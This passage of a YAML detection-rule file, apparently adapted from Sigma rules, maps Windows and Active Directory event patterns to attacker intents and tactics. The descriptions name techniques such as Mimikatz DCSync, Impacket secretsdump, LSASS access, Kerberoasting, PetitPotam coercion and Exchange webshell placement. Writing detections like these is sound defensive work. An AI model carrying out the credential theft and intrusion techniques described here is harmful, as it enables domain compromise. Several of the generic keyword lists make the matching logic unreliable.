  intent: reconnaissance
  tactic: discovery
  description: Detects potential Active Directory enumeration via LDAP
  conditions:
    summary:
      regex_any:
      - potential
      - active
      - directory
      - reconnaissance
      - enumeration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7ac407cc_0f48_4328_aede_de1d2e6fef41
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detect standard users login that are part of high privileged groups
    such as the Administrator group
  conditions:
    summary:
      regex_any:
      - standard
      - user
      - high
      - privileged
      - group
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_550d3350_bb8a_4ff3_9533_2ba533f4a1c0
  intent: unknown
  tactic: resource_development
  description: Detects specific patterns found after a successful ProxyLogon exploitation
    in relation to a Commandlet invocation of Set-OabVirtualDirectory
  conditions:
    summary:
      regex_any:
      - proxylogon
      - msexchange
      - oabvirtualdirectory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b7bc7038_638b_4ffd_880c_292c692209ef
  intent: persistence_installation
  tactic: persistence
  description: Detects a write of an Exchange CSR to an untypical directory or with
    aspx name suffix which can be used to place a webshell
  conditions:
    summary:
      regex_any:
      - certificate
      - request
      - export
      - exchange
      - webserver
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_516376b4_05cd_4122_bae0_ad7641c38d48
  intent: persistence_installation
  tactic: persistence
  description: Detects a successful export of an Exchange mailbox to untypical directory
    or with aspx name suffix which can be used to place a webshell or the needed role
    assignment for it
  conditions:
    summary:
      regex_any:
      - mailbox
      - export
      - exchange
      - webserver
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_09570ae5_889e_43ea_aac0_0e1221fb3d95
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects removal of an exported Exchange mailbox which could be to cover
    tracks from ProxyShell exploit
  conditions:
    summary:
      regex_any:
      - remove
      - exported
      - mailbox
      - from
      - exchange
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9db37458_4df2_46a5_95ab_307e7f29e675
  intent: persistence_installation
  tactic: persistence
  description: Rule to detect an adversary setting OabVirtualDirectory External URL
    property to a script in Exchange Management log
  conditions:
    summary:
      regex_any:
      - exchange
      - oabvirtualdirectory
      - externalurl
      - property
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4fe151c2_ecf9_4fae_95ae_b88ec9c2fca6
  intent: persistence_installation
  tactic: persistence
  description: Detects the Installation of a Exchange Transport Agent
  conditions:
    summary:
      regex_any:
      - msexchange
      - transport
      - agent
      - installation
      - builtin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c7d16cae_aaf3_42e5_9c1c_fb8553faa6fa
  intent: persistence_installation
  tactic: persistence
  description: Detects a failed installation of a Exchange Transport Agent
  conditions:
    summary:
      regex_any:
      - failed
      - msexchange
      - transport
      - agent
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9c8acf1a_cbf9_4db6_b63c_74baabe03e59
  intent: credential_harvesting
  tactic: credential_access
  description: Detects common NTLM brute force device names
  conditions:
    summary:
      regex_any:
      - ntlm
      - brute
      - force
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ce5678bb_b9aa_4fb5_be4b_e57f686256ad
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects logons using NTLM to hosts that are potentially not part of
    the domain.
  conditions:
    summary:
      regex_any:
      - potential
      - remote
      - desktop
      - connection
      - domain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3ce8e9a4_bc61_4c9b_8e69_d7e2492a8781
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects scenarios where an attacker enables the OpenSSH server and
    server starts to listening on SSH socket.
  conditions:
    summary:
      regex_any:
      - openssh
      - server
      - listening
      - socket
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff151c33_45fa_475d_af4f_c2f93571f4fe
  intent: reconnaissance
  tactic: discovery
  description: 'This detection uses Windows security events to detect suspicious access
    attempts to the registry key of Azure AD Health monitoring agent.

    This detection requires an access control entry (ACE) on the system access control
    list (SACL) of the following securable object HKLM\SOFTWARE\Microsoft\Microsoft
    Online\Reporting\MonitoringAgent.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - health
      - monitoring
      - agent
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1d2ab8ac_1a01_423b_9c39_001510eae8e8
  intent: reconnaissance
  tactic: discovery
  description: 'This detection uses Windows security events to detect suspicious access
    attempts to the registry key values and sub-keys of Azure AD Health service agents
    (e.g AD FS).

    Information from AD Health service agents can be used to potentially abuse some
    of the features provided by those services in the cloud (e.g. Federation).

    This detection requires an access control entry (ACE) on the system access control
    list (SACL) of the following securable object: HKLM:\SOFTWARE\Microsoft\ADHealthAgent.

    Make sure you set the SACL to propagate to its sub-keys.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - health
      - service
      - agents
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2c99737c_585d_4431_b61a_c911d86ff32f
  intent: persistence_installation
  tactic: persistence
  description: Backdooring domain object to grant the rights associated with DCSync
    to a regular user or machine account using Powerview\Add-DomainObjectAcl DCSync
    Extended Right cmdlet, will allow to re-obtain the pwd hashes of any user/computer
  conditions:
    summary:
      regex_any:
      - powerview
      - domainobjectacl
      - dcsync
      - extend
      - right
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_35ba1d85_724d_42a3_889f_2e2362bcaf23
  intent: reconnaissance
  tactic: discovery
  description: Detect priv users or groups recon based on 4661 eventid and known privileged
    users or groups SIDs
  conditions:
    summary:
      regex_any:
      - privileged
      - users
      - groups
      - reconnaissance
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bfbd3291_de87_4b7c_88a2_d6a5deb28668
  intent: credential_harvesting
  tactic: credential_access
  description: Detects certificate creation with template allowing risk permission
    subject and risky EKU
  conditions:
    summary:
      regex_any:
      - adcs
      - certificate
      - template
      - configuration
      - vulnerability
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_028c7842_4243_41cd_be6f_12f3cf1a26c7
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects WRITE_DAC access to a domain object
  conditions:
    summary:
      regex_any:
      - object
      - writedac
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_17d619c1_e020_4347_957e_1d1207455c93
  intent: credential_harvesting
  tactic: credential_access
  description: Detects potential abuse of Active Directory Replication Service (ADRS)
    from a non machine account to request credentials.
  conditions:
    summary:
      regex_any:
      - active
      - directory
      - replication
      - from
      - machine
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ab6bffca_beff_4baa_af11_6733f296d57a
  intent: reconnaissance
  tactic: discovery
  description: Detects read access to a domain user from a non-machine account
  conditions:
    summary:
      regex_any:
      - potential
      - user
      - enumeration
      - from
      - machine
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_311b6ce2_7890_4383_a8c2_663a9f6b43cd
  intent: persistence_installation
  tactic: persistence
  description: Detects scenario where if a user is assigned the SeEnableDelegationPrivilege
    right in Active Directory it would allow control of other AD user objects.
  conditions:
    summary:
      regex_any:
      - enabled
      - user
      - right
      - control
      - user
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_300bac00_e041_4ee2_9c36_e262656a6ecc
  intent: persistence_installation
  tactic: persistence
  description: Detects scenarios where one can control another users or computers
    account without having to use their credentials.
  conditions:
    summary:
      regex_any:
      - active
      - directory
      - user
      - backdoors
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f6de9536_0441_4b3f_a646_f4e00f300ffd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects scenario where weak encryption is enabled for a user profile
    which could be used for hash/password cracking.
  conditions:
    summary:
      regex_any:
      - weak
      - encryption
      - enabled
      - kerberoast
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_24549159_ac1b_479c_8175_d42aea947cae
  intent: lateral_movement
  tactic: lateral_movement
  description: This events that are generated when using the hacktool Ruler by Sensepost
  conditions:
    summary:
      regex_any:
      - hacktool
      - ruler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f6de6525_4509_495a_8a82_1f8b0ed73a00
  intent: persistence_installation
  tactic: persistence
  description: Detects remote task creation via at.exe or API interacting with ATSVC
    namedpipe
  conditions:
    summary:
      regex_any:
      - remote
      - task
      - creation
      - atsvc
      - named
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d99b79d2_0a6f_4f46_ad8b_260b6e17f982
  intent: defense_evasion
  tactic: defense_evasion
  description: One of the Windows Eventlogs has been cleared. e.g. caused by "wevtutil
    cl" command execution
  conditions:
    summary:
      regex_any:
      - security
      - eventlog
      - cleared
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8cd538a4_62d5_4e83_810b_12d41e428d6e
  intent: data_staging
  tactic: collection
  description: Potential adversaries accessing the microphone and webcam in an endpoint.
  conditions:
    summary:
      regex_any:
      - processes
      - accessing
      - microphone
      - webcam
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7a95147_145f_4678_b85d_d1ff4a3bb3f6
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects known malicious service installs that appear in cases in which
    a Cobalt Strike beacon elevates privileges or lateral movement
  conditions:
    summary:
      regex_any:
      - cobaltstrike
      - service
      - installations
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_214e8f95_100a_4e04_bb31_ef6cba8ce07e
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the use of the spoolss named pipe over SMB. This can be used
    to trigger the authentication via NTLM of any machine that has the spoolservice
    enabled.
  conditions:
    summary:
      regex_any:
      - dcerpc
      - spoolss
      - named
      - pipe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c39f0c81_7348_4965_ab27_2fde35a1b641
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects a threat actor creating a file named `iertutil.dll` in the
    `C:\Program Files\Internet Explorer\` directory over the network for a DCOM InternetExplorer
    DLL Hijack scenario.
  conditions:
    summary:
      regex_any:
      - dcom
      - internetexplorer
      - application
      - iertutil
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_611eab06_a145_4dfa_a295_3ccc5c20f59a
  intent: unknown
  tactic: s0002
  description: Detects Mimikatz DC sync security events
  conditions:
    summary:
      regex_any:
      - mimikatz
      - sync
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c9eb55c3_b468_40ab_9089_db2862e42137
  intent: unknown
  tactic: initial_access
  description: Detects an installation of a device that is forbidden by the system
    policy
  conditions:
    summary:
      regex_any:
      - device
      - installation
      - blocked
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ab4561b1_6c7e_48a7_ad08_087cfb9ce8f1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects scenarios where system auditing for important events such as
    "Process Creation" or "Logon" events is disabled.
  conditions:
    summary:
      regex_any:
      - important
      - windows
      - event
      - auditing
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a4c90ea1_2634_4ca0_adbb_35eae169b6fc
  intent: defense_evasion
  tactic: defense_evasion
  description: Potential adversaries stopping ETW providers recording loaded .NET
    assemblies.
  conditions:
    summary:
      regex_any:
      - logging
      - disabled
      - processes
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4ac1f50b_3bd0_4968_902d_868b4647937e
  intent: credential_harvesting
  tactic: credential_access
  description: Detects tools extracting LSA secret DPAPI domain backup key from Domain
    Controllers
  conditions:
    summary:
      regex_any:
      - dpapi
      - domain
      - backup
      - extraction
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39a94fd1_8c9a_4ff6_bf22_c058762f8014
  intent: credential_harvesting
  tactic: credential_access
  description: Detects anyone attempting a backup for the DPAPI Master Key. This events
    gets generated at the source and not the Domain Controller.
  conditions:
    summary:
      regex_any:
      - dpapi
      - domain
      - master
      - backup
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a8f29a7b_b137_4446_80a0_b804272f3da2
  intent: lateral_movement
  tactic: lateral_movement
  description: Detect lateral movement using GPO scheduled task, usually used to deploy
    ransomware at scale
  conditions:
    summary:
      regex_any:
      - persistence
      - execution
      - scale
      - scheduled
      - task
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b449a5e_1db5_4dd0_a2dc_4e3a67282538
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a local hidden user account which should not
    happen for event ID 4720.
  conditions:
    summary:
      regex_any:
      - hidden
      - local
      - user
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_98054878_5eab_434c_85d4_72d4e5a3361b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of EDRSilencer, a tool that abuses the Windows Filtering
    Platform (WFP) to block the outbound traffic of running EDR agents based on specific
    hardcoded filter names.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - edrsilencer
      - execution
      - filter
      - added
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b14c76a_c602_4ae6_9717_eff868153fc0
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects execution of NoFilter, a tool for abusing the Windows Filtering
    Platform for privilege escalation via hardcoded policy name indicators

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - nofilter
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0ee4d8a5_4e67_4faf_acfa_62a78457d1f2
  intent: persistence_installation
  tactic: persistence
  description: Rule to detect the Hybrid Connection Manager service installation.
  conditions:
    summary:
      regex_any:
      - hybridconnectionmanager
      - service
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_32d56ea1_417f_44ff_822b_882873f5f43b
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects execution of Impacket's psexec.py.
  conditions:
    summary:
      regex_any:
      - impacket
      - psexec
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_252902e3_5830_4cf6_bf21_c22083dfd5cf
  intent: credential_harvesting
  tactic: credential_access
  description: Detect AD credential dumping using impacket secretdump HKTL
  conditions:
    summary:
      regex_any:
      - possible
      - impacket
      - secretdump
      - remote
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4edf51e1_cb83_4e1a_bc39_800e396068e3
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
      - launcher
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fd0f5778_d3cb_4c9a_9695_66759d04702a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the code block linked in the references
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - obfuscated
      - invocation
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0c718a5e_4284_4fb9_b4d9_b9a50b3a1974
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of stdin to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
      - launcher
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dcf2db1f_f091_425b_a821_c05875b8925a
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7a922f1b_2635_4d6c_91ef_af228b198ad3
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - compress
      - obfuscation
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f241cf1b_3a6b_4e1a_b4f9_133c00dd95ca
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via RUNDLL LAUNCHER
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - rundll
      - launcher
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_80b708f3_d034_40e4_a6c8_d23b7a7db3d1
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via Stdin in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a0a2ff1_611b_4dac_8216_8a7b47c618a6
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9b8d9203_4e0f_4cd9_bb06_4cc4ea6d0e9a
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - mshta
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd0f7229_d16f_42de_8fe3_fba365fbcb3a
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use Rundll32 in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - rundll32
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4c54ba8f_73d2_4d40_8890_d9cf1dca3d30
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
      - obfuscation
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0248a7bc_8a9a_4cd8_a57e_3ae8e073a073
  intent: unknown
  tactic: initial_access
  description: Detects the mount of an ISO image on an endpoint
  conditions:
    summary:
      regex_any:
      - image
      - mounted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d04ae2b8_ad54_4de0_bd87_4bc1da66aa59
  intent: credential_harvesting
  tactic: credential_access
  description: 'This rule will collect the data needed to start looking into possible
    kerberoasting activity.

    Further analysis or computation within the query is needed focusing on requests
    from one specific host/IP towards multiple service names within a time period
    of 5 seconds.

    You can then set a threshold for the number of requests and time between the requests
    to turn this into an alert.

    '
  conditions:
    summary:
      regex_any:
      - kerberoasting
      - activity
      - initial
      - query
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b07e58cf_cacc_4135_8473_ccb2eba63dd2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects modifications to DNS records in Active Directory where the
    Distinguished Name (DN) contains a base64-encoded blob

    matching the pattern "1UWhRCAAAAA...BAAAA". This pattern corresponds to a marshaled
    CREDENTIAL_TARGET_INFORMATION structure,

    commonly used in Kerberos coercion attacks. Adversaries may exploit this to coerce
    victim systems into authenticating to

    attacker-controlled hosts by spoofing SPNs via DNS. It is one of the strong indicators
    of a Kerberos coercion attack,.

    where adversaries manipulate DNS records to spoof Service Principal Names (SPNs)
    and redirect authentication requests like CVE-2025-33073.

    Please investigate the user account that made the changes, as it is likely a low-privileged
    account that has been compromised.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - kerberos
      - coercion
      - spoofing
      - spns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_52d8b0c6_53d6_439a_9e41_52ad442ad9ad
  intent: lateral_movement
  tactic: lateral_movement
  description: This detection excludes known namped pipes accessible remotely and
    notify on newly observed ones, may help to detect lateral movement and remote
    exec using named pipes
  conditions:
    summary:
      regex_any:
      - first
      - time
      - seen
      - remote
      - named
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_962fe167_e48d_4fd6_9974_11e5b9a5d6d1
  intent: credential_harvesting
  tactic: credential_access
  description: Detects potential mimikatz-like tools accessing LSASS from non system
    account
  conditions:
    summary:
      regex_any:
      - lsass
      - access
      - from
      - system
      - account
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f0d1feba_4344_4ca9_8121_a6c97bd6df52
  intent: unknown
  tactic: s0005
  description: Detects well-known credential dumping tools execution via service execution
    events
  conditions:
    summary:
      regex_any:
      - credential
      - dumping
      - tools
      - service
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1de68c67_af5c_4097_9c85_fe5578e09e67
  intent: unknown
  tactic: s0005
  description: Detects wceaux.dll access while WCE pass-the-hash remote command execution
    on source host
  conditions:
    summary:
      regex_any:
      - wceaux
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_72124974_a68b_4366_b990_d30e0b2a190d
  intent: lateral_movement
  tactic: lateral_movement
  description: Alerts on Metasploit host's authentications on the domain.
  conditions:
    summary:
      regex_any:
      - metasploit
      - authentication
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6fb63b40_e02a_403e_9ffd_3bcc1d749442
  intent: execution
  tactic: execution
  description: Detects usage of Metasploit SMB PsExec (exploit/windows/smb/psexec)
    and Impacket psexec.py by triggering on specific service installation
  conditions:
    summary:
      regex_any:
      - metasploit
      - impacket
      - service
      - installation
      - psexec
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ecbc5e16_58e0_4521_9c60_eb9a7ea4ad34
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting
    a specific service installation
  conditions:
    summary:
      regex_any:
      - meterpreter
      - cobalt
      - strike
      - getsystem
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d3abac66_f11c_4ed0_8acb_50cc29c97eed
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects NetNTLM downgrade attack
  conditions:
    summary:
      regex_any:
      - netntlm
      - downgrade
      - attack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_35bc7e28_ee6b_492f_ab04_da58fcf6402e
  intent: persistence_installation
  tactic: persistence
  description: Detects unusual processes accessing desktop.ini remotely over network
    share, which can be leveraged to alter how Explorer displays a folder's content
    (i.e. renaming files) without changing them on disk.
  conditions:
    summary:
      regex_any:
      - windows
      - network
      - access
      - suspicious
      - desktop
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cfeed607_6aa4_4bbd_9627_b637deb723c8
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of a user with the "$" character. This can be
    used by attackers to hide a user or trick detection systems that lack the parsing
    mechanisms.

    '
  conditions:
    summary:
      regex_any:
      - renamed
      - user
      - account
      - with
      - character
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8e5c03fa_b7f0_11ea_b242_07e0576828d9
  intent: lateral_movement
  tactic: lateral_movement
  description: 'This event is generated when an authenticated user who is not allowed
    to log on remotely attempts to connect to this computer through Remote Desktop.

    Often, this event can be generated by attackers when searching for available windows
    servers in the network.

    '
  conditions:
    summary:
      regex_any:
      - denied
      - access
      - remote
      - desktop
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_12ba6a38_adb3_4d6b_91ba_a7fb248e3199
  intent: reconnaissance
  tactic: discovery
  description: Detects when the password policy is enumerated.
  conditions:
    summary:
      regex_any:
      - password
      - policy
      - enumerated
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b687634_ab20_11ea_bb37_0242ac130002
  intent: credential_harvesting
  tactic: credential_access
  description: Detects Windows Pcap driver installation based on a list of associated
    .sys files.
  conditions:
    summary:
      regex_any:
      - windows
      - pcap
      - drivers
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1ce8c8a3_2723_48ed_8246_906ac91061a6
  intent: credential_harvesting
  tactic: credential_access
  description: Detect PetitPotam coerced authentication activity.
  conditions:
    summary:
      regex_any:
      - possible
      - petitpotam
      - coerce
      - authentication
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6a53d871_682d_40b6_83e0_b7c1a6c4e3a5
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detect suspicious Kerberos TGT requests.

    Once an attacer obtains a computer certificate by abusing Active Directory Certificate
    Services in combination with PetitPotam, the next step would be to leverage the
    certificate for malicious purposes.

    One way of doing this is to request a Kerberos Ticket Granting Ticket using a
    tool like Rubeus.

    This request will generate a 4768 event with some unusual fields depending on
    the environment.

    This analytic will require tuning, we recommend filtering Account_Name to the
    Domain Controller computer accounts.

    '
  conditions:
    summary:
      regex_any:
      - petitpotam
      - suspicious
      - kerberos
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_32e19d25_4aed_4860_a55a_be99cb0bf7ed
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects DCShadow via create new SPN
  conditions:
    summary:
      regex_any:
      - possible
      - shadow
      - attack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2a926e6a_4b81_4011_8a96_e36cc8c04302
  intent: execution
  tactic: execution
  description: Detects powershell script installed as a Service
  conditions:
    summary:
      regex_any:
      - powershell
      - scripts
      - installed
      - services
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_45545954_4016_43c6_855e_eae8f1c369dc
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects access to a protected_storage service over the network. Potential
    abuse of DPAPI to extract domain backup keys from Domain Controllers
  conditions:
    summary:
      regex_any:
      - protected
      - storage
      - service
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5bed80b6_b3e8_428e_a3ae_d3c757589e41
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects svchost hosting RDP termsvcs communicating with the loopback
    address
  conditions:
    summary:
      regex_any:
      - over
      - reverse
      - tunnel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_12e6d621_194f_4f59_90cc_1959e21e69f7
  intent: credential_harvesting
  tactic: credential_access
  description: Detects potential use of Rubeus via registered new trusted logon process
  conditions:
    summary:
      regex_any:
      - register
      - logon
      - process
      - rubeus
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_13acf386_b8c6_4fe0_9a6e_c4756b974698
  intent: execution
  tactic: execution
  description: Detects basic PowerShell Remoting (WinRM) by monitoring for network
    inbound connections to ports 5985 OR 5986
  conditions:
    summary:
      regex_any:
      - remote
      - powershell
      - sessions
      - network
      - connections
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5a44727c_3b85_4713_8c44_4401d5499629
  intent: credential_harvesting
  tactic: credential_access
  description: Detects possible Kerberos Replay Attack on the domain controllers when
    "KRB_AP_ERR_REPEAT" Kerberos response is sent to the client
  conditions:
    summary:
      regex_any:
      - replay
      - attack
      - detected
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f8748f2c_89dc_4d95_afb0_5a2dfdbad332
  intent: credential_harvesting
  tactic: credential_access
  description: Detects handles requested to SAM registry hive
  conditions:
    summary:
      regex_any:
      - registry
      - hive
      - handle
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_13addce7_47b2_4ca0_a98f_1de964d1d669
  intent: reconnaissance
  tactic: discovery
  description: Detects non-system users failing to get a handle of the SCM database.
  conditions:
    summary:
      regex_any:
      - database
      - handle
      - failure
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dae8171c_5ec6_4396_b210_8466585b53e9
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects non-system users performing privileged operation os the SCM
    database
  conditions:
    summary:
      regex_any:
      - database
      - privileged
      - operation
  weights:
    base: 0.6
